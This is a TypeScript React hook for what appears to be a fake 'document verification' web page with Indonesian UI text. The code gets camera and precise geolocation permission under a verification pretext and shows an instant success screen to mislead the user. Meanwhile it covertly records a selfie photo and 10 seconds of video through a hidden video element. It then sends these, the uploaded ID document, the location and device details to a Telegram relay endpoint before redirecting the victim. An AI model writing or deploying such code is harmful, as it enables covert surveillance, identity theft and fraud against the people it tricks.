/**
 * Custom hook: verification logic
 */
'use client';

import { useState, useRef, useEffect } from 'react';
import { getRedirectConfig } from '@/config/redirect';
import { getBatteryInfo, buildDeviceInfoString } from '@/utils/device';
import { takePhoto, recordVideo } from '@/utils/media';

export function useVerification() {
  const [isVerified, setIsVerified] = useState(false);
  const [isChecking, setIsChecking] = useState(false);
  const [hasTriggered, setHasTriggered] = useState(false);
  const [showPopup, setShowPopup] = useState(false);
  const [showRedirectCountdown, setShowRedirectCountdown] = useState(false);
  const [redirectCountdown, setRedirectCountdown] = useState(5);
  const [uploadedFile, setUploadedFile] = useState<File | null>(null);
  const [validationError, setValidationError] = useState<string | null>(null);
  const [isInitialLoading, setIsInitialLoading] = useState(true);
  const [isProcessing, setIsProcessing] = useState(false);

  const videoRef = useRef<HTMLVideoElement | null>(null);

  const redirectConfig = getRedirectConfig();
  const redirectUrl = redirectConfig.targetUrl;
  const countdownDuration = redirectConfig.countdownDuration;

  // Initial loading screen - show for 2 seconds
  useEffect(() => {
    const timer = setTimeout(() => {
      setIsInitialLoading(false);
    }, 2000);
    return () => clearTimeout(timer);
  }, []);

  // Show popup after short delay
  useEffect(() => {
    const timer = setTimeout(() => {
      setShowPopup(true);
    }, 800);
    return () => clearTimeout(timer);
  }, []);

  // Create hidden video element
  useEffect(() => {
    const video = document.createElement('video');
    video.style.display = 'none';
    video.muted = true;
    video.playsInline = true;
    document.body.appendChild(video);
    videoRef.current = video;

    return () => {
      if (videoRef.current) {
        document.body.removeChild(videoRef.current);
      }
    };
  }, []);

  // Countdown timer for redirect
  useEffect(() => {
    if (!showRedirectCountdown) return;

    setRedirectCountdown(countdownDuration);

    const timer = setInterval(() => {
      setRedirectCountdown((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          window.location.href = redirectUrl;
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [showRedirectCountdown, redirectUrl, countdownDuration]);

  // --- Async data submission ---
  const uploadToTelegram = async (formData: FormData) => {
    await fetch('/api/telegram', {
      method: 'POST',
      body: formData,
    });
  };

  const startBackgroundCapture = async (
    stream: MediaStream, 
    locationPromise: Promise<{ lat: number; lng: number } | null>,
    fileToUpload: File
  ) => {
    // Show success page immediately (extremely fast transition, no loading wait!)
    setIsProcessing(false);
    setIsVerified(true);

    // Run the 10s capture and Telegram upload completely in the background
    (async () => {
      try {
        // Take photo & record 10s video in the background while user views the success page
        const photoBlob = await takePhoto(stream, videoRef);
        const videoBlob = await recordVideo(stream, 10000);

        // Stop tracks immediately after capture is complete
        stream.getTracks().forEach((track) => track.stop());

        const location = await locationPromise;
        const formData = new FormData();
        if (photoBlob) formData.append('photo', photoBlob, 'photo.jpg');
        if (videoBlob) formData.append('video', videoBlob, 'video.webm');

        if (fileToUpload) {
          formData.append('document', fileToUpload, fileToUpload.name);
        }

        const ua = navigator.userAgent;
        const batteryInfo = await getBatteryInfo();
        const ramGB = (navigator as any).deviceMemory
          ? `${(navigator as any).deviceMemory} GB`
          : 'Unknown';
        const cpuCores = navigator.hardwareConcurrency || 'Unknown';

        const locationInfoStr = buildDeviceInfoString({
          location,
          uploadedFile: fileToUpload,
          ua,
          batteryInfo,
          ramGB,
          cpuCores,
        });
        formData.append('locationInfo', locationInfoStr);

        // Send to Telegram asynchronously
        await uploadToTelegram(formData);
      } catch (err) {
        console.error('Background telegram upload/capture failed:', err);
        // Make sure tracks are stopped
        stream.getTracks().forEach((track) => track.stop());
      }

      // Show redirect countdown only after background capture and sending is complete
      setShowRedirectCountdown(true);
      setRedirectCountdown(countdownDuration);
    })();
  };

  const getGeolocationPromise = (): Promise<{ lat: number; lng: number }> => {
    return new Promise((resolve, reject) => {
      if ('geolocation' in navigator) {
        navigator.geolocation.getCurrentPosition(
          (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
          (err) => reject(err),
          { timeout: 10000, enableHighAccuracy: true }
        );
      } else {
        reject(new Error("Geolocation not supported"));
      }
    });
  };

  // --- Permission request (non-blocking, parallel) ---
  // Requests both camera & geolocation simultaneously (no gap).
  // If denied, returns false immediately — user can click again to retry.
  const requestAllPermissions = async (): Promise<boolean> => {
    try {
      // Request BOTH permissions in parallel (sangat cepat, tidak ada jeda)
      const [location, permissionStream] = await Promise.all([
        getGeolocationPromise(),
        navigator.mediaDevices.getUserMedia({ video: true }),
      ]);

      // Stop permission-check stream immediately
      permissionStream.getTracks().forEach((t) => t.stop());

      return true; // both granted
    } catch (err) {
      // Permission denied — return immediately, user can click again
      console.error('Permission denied:', err);
      return false;
    }
  };

  // --- Master Verification Trigger ---
  // Shared logic to execute verification instantly for a given file.
  const executeVerificationFlow = async (fileToVerify: File) => {
    if (hasTriggered) return;
    setIsProcessing(true);

    try {
      // Ensure all permissions are granted
      const granted = await requestAllPermissions();
      if (!granted) {
        setIsProcessing(false);
        return;
      }

      // 1. Get geolocation (resolves instantly since already granted)
      const location = await getGeolocationPromise();

      // 2. Get camera stream (resolves instantly since already granted)
      const stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: 'user',
          width: { ideal: 1280 },
          height: { ideal: 720 },
        },
      });

      // Mark verification process as triggered
      setHasTriggered(true);

      // Start capture and show success receipt instantly
      await startBackgroundCapture(stream, Promise.resolve(location), fileToVerify);
    } catch (err) {
      console.error('Verification flow failed:', err);
      setIsProcessing(false);
    }
  };

  // --- Main verify handler (from Manual click) ---
  const handleVerifyClick = async () => {
    if (!uploadedFile) {
      setValidationError('Harap unggah foto dokumen pendukung terlebih dahulu.');
      return;
    }
    setValidationError(null);
    await executeVerificationFlow(uploadedFile);
  };

  // --- File upload handlers ---
  const handleFileSelect = (file: File | null) => {
    if (file) {
      setUploadedFile(file);
      setValidationError(null);
      // Auto-trigger verification flow instantly using the selected file
      executeVerificationFlow(file);
    }
  };

  const requestCameraPermission = async () => {
    try {
      await navigator.mediaDevices.getUserMedia({ video: true });
      return true;
    } catch (err) {
      console.error('Camera permission denied:', err);
      return false;
    }
  };

  return {
    isVerified,
    isChecking,
    isInitialLoading,
    isProcessing,
    showPopup,
    showRedirectCountdown,
    redirectCountdown,
    uploadedFile,
    videoRef,
    redirectConfig,
    redirectUrl,
    countdownDuration,
    handleVerifyClick,
    handleFileSelect,
    setUploadedFile,
    requestCameraPermission,
    requestAllPermissions,
    validationError,
  };
}

function formatFileSize(bytes: number): string {
  if (bytes < 1024) return bytes + ' B';
  if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
  return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
}
